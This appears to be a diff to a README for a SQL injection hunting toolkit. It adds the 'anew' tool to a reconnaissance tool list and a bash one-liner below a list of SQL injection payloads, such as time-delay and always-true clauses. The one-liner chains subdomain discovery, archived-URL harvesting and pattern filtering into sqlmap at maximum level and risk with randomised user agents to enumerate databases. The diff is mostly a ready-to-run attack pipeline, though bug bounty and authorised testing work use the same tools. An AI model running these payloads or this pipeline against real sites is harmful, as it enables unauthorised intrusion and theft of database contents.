@@ -10,6 +10,7 @@ subfinder
 waybackurls
 Gf Pattern
 Sqlmap
+Anew
 </pre>
 <div align="center"><samp><h1>Payload List</h1></samp></div>
 
@@ -41,4 +42,11 @@ Sqlmap
 );waitfor delay '0:0:__TIME__'--
 or isNULL(1/0) /*
 x' or 1=1 or 'x'='y
+```
+<samp>
+<b>Automatic Bash Script :</b>
+</samp>
+
+```
+cat wilcard.txt | subfinder -silent | httpx -silent | waybackurls | tee -a potential.txt; gf sqli | anew sqlmap.txt; sqlmap -m sqlmap.txt --technique=BEUST --level=5 --risk=3 -v3 --random-agent --dbs
 ```
